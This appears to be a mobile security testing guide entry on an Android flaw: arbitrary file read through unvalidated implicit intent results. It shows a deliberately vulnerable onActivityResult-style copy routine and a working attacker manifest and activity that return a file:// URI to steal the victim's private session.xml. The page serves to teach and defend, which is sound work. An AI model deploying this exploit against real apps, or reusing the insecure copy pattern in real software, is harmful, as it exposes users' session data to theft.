---
masvs_category: MASVS-CODE
platform: android
title: Arbitrary File Read via Implicit Intent Results
---

When an application uses an implicit intent to request content from other applications (e.g., using a custom action like `com.victim.app.ACTION_ATTACH_FILE`) and processes the returned data without validation, it can be vulnerable to an Arbitrary File Read attack.

If an attacker application registers an intent filter for the same action, it can intercept the request. The attacker app can then return a malicious result to the victim app, such as a `file://` URI pointing to a sensitive file within the victim app's private internal storage (e.g., `/data/data/<victim_app>/shared_preferences/session.xml`).

### Vulnerability Mechanism

A common vulnerable pattern occurs when the victim app receives the URI in its `onActivityResult` callback and copies the content of that URI to a public or accessible location (like external cache or external storage) so it can be used or uploaded.

```java
private void performAction(Intent intent, Context context){
  Uri data = intent.getData();
  if (data != null) {
      getFileItemFromUri(context, data);
  }
}

private File getFileItemFromUri(Context context, Uri uri){
  // Vulnerable: Blindly trusting the provided URI
  File file = new File(context.getExternalCacheDir(), "tmp_file");
  try {
      file.createNewFile();
      // The victim app reads its own private file and copies it to a public location
      copy(context.getContentResolver().openInputStream(uri), new FileOutputStream(file));
  } catch (IOException e) {
      // ...
  }
  return file;
}
```

### Exploitation (Attacker Application)

An attacker app can exploit this by declaring an activity that handles the custom `ACTION_ATTACH_FILE` action.

#### Attacker Manifest
```xml
<application>
  <activity android:name=".EvilContentActivity" android:exported="true">
      <intent-filter android:priority="999">
          <action android:name="com.victim.app.ACTION_ATTACH_FILE" />
          <category android:name="android.intent.category.DEFAULT" />
      </intent-filter>
  </activity>
</application>
```

#### Attacker Activity
When the victim triggers the intent and the user selects the attacker's app (or if the victim automatically routes to the highest priority intent), the attacker app returns the malicious `file://` URI.

```java
public class EvilContentActivity extends Activity {
  @Override
  protected void onCreate(Bundle savedInstanceState){
    super.onCreate(savedInstanceState);
    // Return a URI pointing to the victim's private data
    Intent resultIntent = new Intent();
    resultIntent.setData(Uri.parse("file:///data/data/com.victim.app/shared_prefs/session.xml"));
    setResult(Activity.RESULT_OK, resultIntent);
    finish();
  }
}
```

Once the victim app copies `session.xml` to `getExternalCacheDir()`, the attacker app can read the copied file using the `READ_EXTERNAL_STORAGE` permission, successfully stealing the victim's private data.
